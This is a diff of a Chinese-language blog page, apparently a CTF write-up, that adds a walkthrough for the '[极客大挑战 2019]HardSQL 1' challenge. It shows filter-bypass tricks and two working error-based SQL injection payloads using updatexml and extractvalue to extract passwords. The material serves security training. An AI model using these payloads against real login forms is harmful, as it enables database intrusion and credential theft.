@@ -1422,6 +1422,10 @@
 <p>套到语句中就是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1|| flag from Flag</span><br></pre></td></tr></table></figure>
 <p>1|| flag &#x3D; 1,相当于查询flag字段和1<br>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1<br><img src="/img/197.png"></p>
+<h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h2><p>使用burp跑一下fuzz测试<br><code>/check.php?username=1&amp;password=1&#39;(测试位置)</code><br><code>username=&#39;1&#39;&amp;password=&#39;1&#39;%23&#39;</code><br>发现and、空格、&#x3D;被过滤，–+和#无法使用<br>所以用（）代替空格，用^来代替and，^连接函数，形成异或,因为前面的账号密码为假，后面为真所以异或为真，对#进行url编码%23<br>前面的步骤省略，爆出库名：geek，表名：H4rDsq1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=11&amp;password=1&#x27;^updatexml(1,concat(&#x27;~&#x27;,(select(password)from(H4rDsq1))),1)%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=44&amp;password=1&#x27;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23</span><br></pre></td></tr></table></figure>
+<p>updatexml语法就比extractvalue后面多了一个1<br>right函数用于截取字符串 password 的后30个字符,因为updatexml、extractvalue都只能一次性读取32个字符</p>
 
           
         
